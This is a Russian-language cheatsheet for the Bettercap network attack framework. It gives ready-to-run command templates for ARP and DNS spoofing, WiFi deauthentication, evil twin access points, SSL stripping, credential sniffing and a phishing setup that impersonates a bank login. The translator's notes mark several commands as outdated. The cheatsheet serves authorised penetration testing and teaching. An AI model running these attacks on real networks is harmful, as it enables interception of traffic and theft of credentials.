<a id="-bettercap---network-attack-framework-cheatsheet"></a>
# 🦈 Bettercap — шпаргалка по платформе сетевых атак

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Главная](../../README.ru.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Swiss Army Knife for Network Attacks
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [🎯 Что такое Bettercap](#-what-is-bettercap)
- [🚀 Установка](#-installation)
- [💻 Основы использования](#-basic-usage)
- [🔍 Сетевая разведка](#-network-reconnaissance)
- [🎭 Подмена ARP (MITM)](#-arp-spoofing-mitm)
- [🌐 Подмена DNS](#-dns-spoofing)
- [📶 Атаки на WiFi](#-wifi-attacks)
- [🔒 Понижение защиты HTTPS](#-https-downgrade)
- [🔓 Перехват учётных данных](#-credential-sniffing)
- [📜 Caplet-сценарии](#-caplets)
- [🌐 Веб-интерфейс](#-web-ui)
- [📊 Краткий справочник](#-quick-reference)

---

<a id="-what-is-bettercap"></a>
## 🎯 Что такое Bettercap

> **Уточнение:** «преемник ettercap» — характеристика оригинала, а не заявление о прямой преемственности проектов. Bettercap — самостоятельная модульная платформа; см. [официальное описание](https://www.bettercap.org/project/introduction/).

**Bettercap** — универсальный инструмент для разведки WiFi, Bluetooth и обычных сетей. В оригинале он назван преемником ettercap с современными возможностями:

- 🔍 **Сетевая разведка** — обнаружение узлов и служб
- 🎭 **Атаки MITM** (посредник между сторонами) — подмена ARP и DNS
- 📶 **Атаки на WiFi** — деаутентификация (отключение клиентов), evil twin (двойник точки доступа), захват handshake (рукопожатия)
- 🔓 **Перехват учётных данных** — HTTP, HTTPS (при понижении защиты)
- 📡 **Bluetooth/BLE** — обнаружение устройств и атаки
- 🌐 **Веб-интерфейс** — наглядное визуальное управление

<a id="features"></a>
### Возможности

| Возможность | Описание |
|---------|-------------|
| **Модульность** | Расширение с помощью caplet-сценариев |
| **Интерактивность** | Командная оболочка с выполнением в реальном времени |
| **Сценарии** | Автоматизация с помощью caplet-файлов |
| **Веб-интерфейс** | Управление из браузера |
| **Язык Go** | Высокая скорость, современная реализация, поддержка разных платформ |

---

<a id="-installation"></a>
## 🚀 Установка

<a id="kali-linux-pre-installed"></a>
### Kali Linux (предустановлен)

```bash
# Уже установлен в Kali
bettercap --help

# Обновление
sudo apt update && sudo apt install bettercap
```

<a id="debianubuntu"></a>
### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

<a id="from-source"></a>
### Из исходного кода

> **Версии и зависимости:** одной установки Go недостаточно для всех вариантов сборки: нужны системные библиотеки и инструменты сборки для выбранной платформы. Путь Go-модуля в актуальном примере содержит `/v2`; команда оригинала сохранена. Требования перечислены в [руководстве по установке](https://www.bettercap.org/project/installation/).

```bash
# Сначала установите Go
sudo apt install golang

# Установка bettercap
go install github.com/bettercap/bettercap@latest

# Или
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

<a id="install-ui-optional"></a>
### Установка интерфейса (необязательно)

```bash
# Загрузка веб-интерфейса
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

<a id="-basic-usage"></a>
## 💻 Основы использования

<a id="start-bettercap"></a>
### Запуск Bettercap

```bash
# Обычный запуск (требуются права root)
sudo bettercap

# Указание интерфейса
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Неинтерактивный режим (выполнение команд)
sudo bettercap -eval "net.probe on; net.show"

# Загрузка caplet-файла
sudo bettercap -caplet http-ui
```

<a id="interactive-shell"></a>
### Интерактивная оболочка

```bash
# В оболочке bettercap
» help                      # Показать все команды
» help net.probe            # Справка по конкретному модулю
» net.show                  # Показать обнаруженные узлы
» set arp.spoof.targets X   # Задать переменную
» arp.spoof on              # Включить модуль
» quit                      # Выход
```

<a id="module-management"></a>
### Управление модулями

```bash
# Список всех модулей
» help

# Сведения о модуле
» help arp.spoof

# Включить модуль
» arp.spoof on

# Выключить модуль
» arp.spoof off

# Просмотр параметров модуля
» get arp.spoof.*
```

---

<a id="-network-reconnaissance"></a>
## 🔍 Сетевая разведка

<a id="host-discovery"></a>
### Обнаружение узлов

```bash
# Включить активное обнаружение узлов
» net.probe on

# Показать обнаруженные узлы
» net.show

# Пример вывода:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

<a id="network-info"></a>
### Сведения о сети

```bash
# Показать текущий интерфейс
» net.show

# Сведения об интерфейсе
» get net.interface.*

# Сведения о шлюзе
» get gateway.*
```

<a id="probe-options"></a>
### Параметры активного обнаружения

> **Уточнение:** в текущей документации `net.probe.passive` и `net.probe.timeout` не перечислены; `net.probe` активно посылает пробы, а `net.recon` обнаруживает узлы по системной ARP-таблице. `net.probe.throttle` задаётся в миллисекундах. См. [net.probe](https://www.bettercap.org/modules/ethernet/netprobe/) и [net.recon](https://www.bettercap.org/modules/ethernet/netrecon/).

```bash
# Задать задержку между пробами
» set net.probe.throttle 10

# Пассивный режим (только прослушивание)
» set net.probe.passive true

# Задать время ожидания пробы
» set net.probe.timeout 500
```

<a id="recon-commands"></a>
### Команды разведки

> **Уточнение:** `net.show.meta` включает метаданные, а не фильтр активности; `net.sniff.output` сохраняет пакеты PCAP, а не экспортирует список узлов. Подписи и команды оригинала сохранены. См. [net.recon](https://www.bettercap.org/modules/ethernet/netrecon/) и [net.sniff](https://www.bettercap.org/modules/ethernet/netsniff/).

```bash
# Полная разведка
» net.recon on

# Очистить список узлов
» net.clear

# Показать только активные узлы
» set net.show.meta true
» net.show

# Экспорт в файл
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

<a id="-arp-spoofing-mitm"></a>
## 🎭 Подмена ARP (MITM)

<a id="basic-arp-spoof"></a>
### Базовая подмена ARP

```bash
# Запуск bettercap
sudo bettercap -iface eth0

# Включить активное обнаружение
» net.probe on

# Подождать, затем показать узлы
» net.show

# Задать целевой узел (жертву)
» set arp.spoof.targets 192.168.1.100

# Включить подмену ARP
» arp.spoof on

# Теперь вы находитесь в позиции MITM!
```

<a id="full-duplex-both-directions"></a>
### Полный дуплекс (оба направления)

```bash
# Подменить ARP у жертвы и шлюза
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

<a id="spoof-entire-subnet"></a>
### Подмена во всей подсети

> **Уточнение:** `arp.spoof.internal` добавляет подмену для соединений между локальными узлами; этот параметр сам по себе не означает «не подменять шлюз». См. [arp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/).

```bash
# Выбрать все узлы (кроме шлюза)
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Только внутренние узлы (без подмены у шлюза)
» set arp.spoof.internal true
» arp.spoof on
```

<a id="arp-spoof--sniff"></a>
### Подмена ARP и перехват трафика

```bash
# Полная настройка MITM
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

<a id="-dns-spoofing"></a>
## 🌐 Подмена DNS

<a id="basic-dns-spoof"></a>
### Базовая подмена DNS

```bash
# Задать домены для подмены DNS
» set dns.spoof.domains example.com, *.example.com

# Задать адрес перенаправления (ваша машина)
» set dns.spoof.address 192.168.1.50

# Включить (требуется подмена ARP)
» arp.spoof on
» dns.spoof on
```

<a id="spoof-all-domains"></a>
### Подмена всех доменов

```bash
# Шаблон со звёздочкой — перенаправить всё
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

<a id="multiple-domains"></a>
### Несколько доменов

```bash
# Список доменов
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

<a id="dns-spoof-with-http-server"></a>
### Подмена DNS с HTTP-сервером

```bash
# Полная настройка фишингового примера
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Запустить HTTP-сервер на вашей машине
» set http.server.path /var/www/phishing
» http.server on
```

---

<a id="-wifi-attacks"></a>
## 📶 Атаки на WiFi

<a id="enable-wifi-mode"></a>
### Включение режима WiFi

> **Требования:** для WiFi нужны совместимый адаптер и драйвер с monitor mode и инъекцией пакетов; переход в нужный режим Bettercap выполняет автоматически. См. [документацию WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# Запустить с интерфейсом WiFi
sudo bettercap -iface wlan0

# Включить разведку WiFi
» wifi.recon on

# Показать обнаруженные точки доступа
» wifi.show
```

<a id="wifi-reconnaissance"></a>
### Разведка WiFi

```bash
# Показать все точки доступа
» wifi.show

# Пример вывода:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

<a id="deauthentication-attack"></a>
### Атака деаутентификации

> **Версионное уточнение:** `wifi.deauth.station` и `wifi.deauth.repeat` не входят в текущий перечень параметров WiFi; примеры сохранены из оригинала и не универсальны. См. [команды и параметры WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# Деаутентифицировать всех клиентов выбранной точки доступа
» wifi.deauth AA:BB:CC:DD:EE:FF

# Деаутентифицировать конкретного клиента
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Непрерывная деаутентификация
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

<a id="handshake-capture"></a>
### Захват рукопожатия

> **Уточнение:** `wifi.show.wpa` отсутствует в текущем перечне команд. При включённом по умолчанию `wifi.handshakes.aggregate` параметр `wifi.handshakes.file` обозначает файл PCAP; каталог используется при отключённом объединении. См. [WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# Включить разведку WiFi
» wifi.recon on

# Задать канал (тот же, что у цели)
» wifi.recon.channel 6

# Захватывать рукопожатия
» set wifi.handshakes.file /tmp/handshakes/

# Деаутентифицировать для повторного подключения
» wifi.deauth AA:BB:CC:DD:EE:FF

# Проверить захваченные рукопожатия
» wifi.show.wpa
```

<a id="evil-twin-attack"></a>
### Атака Evil Twin (двойник точки доступа)

> **Уточнение:** документированная команда `wifi.ap` посылает поддельные beacon-кадры и требует работающего `wifi.recon`; это не полноценная точка доступа с обслуживанием клиентов и маршрутизацией. Форма `wifi.ap on` сохранена из оригинала. См. [WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# Клонировать точку доступа
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Запустить поддельную точку доступа
» wifi.ap on

# Теперь деаутентифицировать клиентов настоящей точки доступа для подключения к поддельной
» wifi.deauth <real_AP_BSSID>
```

<a id="pmkid-attack"></a>
### Атака на основе PMKID

> **Ограничение:** получение PMKID без подключённого клиента зависит от уязвимости и конфигурации точки доступа; оно не гарантируется для любой сети. См. [WiFi](https://www.bettercap.org/modules/wifi/).

```bash
# Современная атака без подключённого клиента
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID сохраняется в каталоге рукопожатий
» wifi.show.wpa
```

---

<a id="-https-downgrade"></a>
## 🔒 Понижение защиты HTTPS

<a id="ssl-strip-hsts-bypass"></a>
### SSL Strip (обход HSTS)

> **Исправление оригинала:** SSL stripping не обеспечивает общего обхода HSTS. Для известного HSTS-узла браузер переводит HTTP в HTTPS до отправки запроса и прекращает соединение при ошибках TLS. HTTPS-прокси подменяет цепочку сертификатов своим CA, которому клиент должен доверять для прозрачной работы. См. [RFC 6797](https://www.rfc-editor.org/rfc/rfc6797.html#section-8.3) и [https.proxy](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/).

```bash
# Сначала включить подмену ARP
» arp.spoof on

# Включить SSL stripping
» set https.proxy.sslstrip true
» https.proxy on

# Или использовать прокси HTTP
» http.proxy on
```

<a id="https-proxy"></a>
### Прокси HTTPS

```bash
# Настроить прокси HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# С сертификатом
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

<a id="capture-https-traffic"></a>
### Перехват трафика HTTPS

```bash
# Полный пример MITM с HTTPS
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

<a id="-credential-sniffing"></a>
## 🔓 Перехват учётных данных

<a id="http-credentials"></a>
### Учётные данные HTTP

```bash
# Включить перехват трафика
» net.sniff on

# Включить перехват локального трафика
» set net.sniff.local true
» net.sniff on

# Фильтр HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

<a id="credential-harvesting"></a>
### Сбор учётных данных

```bash
# Полный пример перехвата учётных данных
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Учётные данные появляются в реальном времени
```

<a id="save-to-file"></a>
### Сохранение в файл

```bash
# Сохранить захваченные пакеты
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Подробный вывод
» set net.sniff.verbose true
» net.sniff on
```

---

<a id="-caplets"></a>
## 📜 Caplet-сценарии

<a id="what-are-caplets"></a>
### Что такое caplet-сценарии?

Caplet — файл сценария (.cap), автоматизирующий команды bettercap.

<a id="built-in-caplets"></a>
### Готовые caplet-сценарии

```bash
# Список caplet-сценариев
» caplets.show

# Часто используемые caplet-сценарии:
- http-ui       # Веб-интерфейс
- https-ui      # Защищённый веб-интерфейс
- local-sniffer # Перехват локального трафика
- mitm          # Базовая настройка MITM
- pita          # Автоматизация атак на WiFi
```

<a id="load-caplet"></a>
### Загрузка caplet-сценария

> **Уточнение:** актуальная документация описывает загрузку через параметр запуска и команду `include`; форма `caplet http-ui` сохранена из оригинала. Доступность готовых сценариев зависит от установленного набора. См. [caplets](https://www.bettercap.org/modules/core/caplets/) и [интерактивная сессия](https://www.bettercap.org/usage/interactive_session/).

```bash
# Из командной строки
sudo bettercap -caplet http-ui

# Внутри bettercap
» caplet http-ui

# Из файла
sudo bettercap -caplet /path/to/custom.cap
```

<a id="create-custom-caplet"></a>
### Создание своего caplet-сценария

```bash
# Файл: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Запуск своего caplet-сценария
sudo bettercap -caplet my-mitm.cap
```

<a id="update-caplets"></a>
### Обновление caplet-сценариев

```bash
# Обновить все caplet-сценарии
» caplets.update
```

---

<a id="-web-ui"></a>
## 🌐 Веб-интерфейс

<a id="start-web-ui"></a>
### Запуск веб-интерфейса

> **Версионное уточнение:** показан прежний способ запуска через caplet-сценарии. В текущем руководстве интерфейс запускается модулем `ui`; схема URL, порт и учётные данные определяются конфигурацией, поэтому приведённые адрес и `user/pass` не универсальны. См. [Web UI](https://www.bettercap.org/usage/web_ui/).

```bash
# Сначала установить интерфейс
sudo bettercap -eval "caplets.update; ui.update; quit"

# Запустить с веб-интерфейсом (HTTP)
sudo bettercap -caplet http-ui

# Запустить с интерфейсом HTTPS
sudo bettercap -caplet https-ui

# Адрес: https://127.0.0.1:8080/
# Учётные данные по умолчанию: user/pass
```

<a id="web-ui-features"></a>
### Возможности веб-интерфейса

| Возможность | Описание |
|---------|-------------|
| **Dashboard** | Состояние сети в реальном времени |
| **Hosts** | Обнаруженные устройства |
| **WiFi** | Беспроводные сети |
| **BLE** | Устройства Bluetooth |
| **Events** | Журнал событий |
| **Packets** | Захваченный трафик |

<a id="configure-web-ui"></a>
### Настройка веб-интерфейса

> **Уточнение:** `http.server.*` настраивает HTTP-сервер раздачи файлов; это не настройки аутентификации REST API. Интерфейс и API настраиваются своими модулями. См. [http.server](https://www.bettercap.org/modules/ethernet/servers/httpserver/), [Web UI](https://www.bettercap.org/usage/web_ui/) и [api.rest](https://www.bettercap.org/modules/core/apirest/).

```bash
# Задать учётные данные
» set http.server.username admin
» set http.server.password secretpass

# Задать порт
» set http.server.port 8080

# Адрес привязки
» set http.server.address 0.0.0.0
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
|---------|-------------|
| `net.probe on` | Начать обнаружение узлов |
| `net.show` | Показать обнаруженные узлы |
| `arp.spoof on` | Включить подмену ARP |
| `net.sniff on` | Начать захват пакетов |
| `dns.spoof on` | Включить подмену DNS |
| `wifi.recon on` | Начать сканирование WiFi |
| `wifi.deauth BSSID` | Атака деаутентификации |
| `https.proxy on` | Включить прокси HTTPS |

<a id="common-variables"></a>
### Часто используемые переменные

| Переменная | Описание |
|----------|-------------|
| `arp.spoof.targets` | Целевые узлы MITM |
| `arp.spoof.fullduplex` | Подмена в обоих направлениях |
| `dns.spoof.domains` | Домены для подмены |
| `dns.spoof.address` | IP-адрес перенаправления |
| `net.sniff.output` | Выходной файл PCAP |
| `wifi.ap.ssid` | Имя поддельной точки доступа |

<a id="mitm-attack-template"></a>
### Шаблон атаки MITM

```bash
# Базовый пример MITM
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

<a id="wifi-attack-template"></a>
### Шаблон атаки на WiFi

```bash
# Деаутентификация WiFi и захват
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

<a id="complete-phishing-attack"></a>
### Полный пример фишинговой атаки

```bash
# Подмена DNS и поддельный сайт
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ Правовые ограничения

```
⚠️ ВНИМАНИЕ: Bettercap — мощный инструмент перехвата 
сетевого трафика. Используйте его только в СВОИХ сетях или при наличии 
ЯВНОГО ПИСЬМЕННОГО РАЗРЕШЕНИЯ на проверку.

✅ Тестирование на проникновение с разрешения владельца
✅ Исследование безопасности (в лабораторной среде)
✅ Образовательные цели

❌ Перехват без разрешения НЕЗАКОНЕН
❌ Не используйте в общественных сетях
❌ Не крадите учётные данные
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Официальный сайт Bettercap](https://www.bettercap.org/)
- [Bettercap на GitHub](https://github.com/bettercap/bettercap)
- [Документация Bettercap](https://www.bettercap.org/modules/)
- [Caplet-сценарии](https://github.com/bettercap/caplets)

<a id="related-cheatsheets"></a>
### Другие шпаргалки
- [Aircrack-ng](../../Aircrack-ng/translations/README.ru.md)
- [Wifite](../../Wifite/translations/README.ru.md)
- [Wireshark](../../Wireshark/translations/README.ru.md)

---

<p align="center">
  <b>🦈 Осваивайте сетевые атаки!</b><br>
  <i>Bettercap — универсальный инструмент для тестирования сетей на проникновение</i>
</p>
